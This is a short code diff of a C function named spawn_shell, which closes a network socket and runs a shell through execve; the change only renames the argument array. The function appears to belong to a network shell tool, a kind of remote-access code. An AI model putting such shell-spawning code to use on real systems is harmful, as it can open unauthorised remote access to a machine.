@@ -21,8 +21,8 @@ int spawn_shell(int network_socket, const char *shell_path){
         close(network_socket);
 
         // execute a shell
-        char *shell[] = {(char*)shell_path, NULL};
-        execve(shell_path, shell, NULL);
+        char *shell_args[] = {(char*)shell_path, NULL};
+        execve(shell_path, shell_args, NULL);
         
         // if execve returns, it means there was an error
         perror("execve failed");
